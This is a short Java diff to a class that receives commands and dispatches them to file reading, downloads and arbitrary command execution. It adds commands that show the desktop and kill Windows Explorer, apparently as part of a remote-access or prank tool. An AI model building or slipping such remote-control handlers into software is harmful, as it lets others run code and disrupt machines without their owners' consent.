@@ -66,6 +66,10 @@ public class CommandReciver {
             readFile(command);
         } else if (command.startsWith("download")) {
             new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
+        } else if (command.startsWith("desktop")) {
+            new BonziFunctions().showDesktop();
+        } else if (command.startsWith("kill")) {
+            new BonziFunctions().killExplorer();
         } else {
             executeNormalCommand(command);
         }
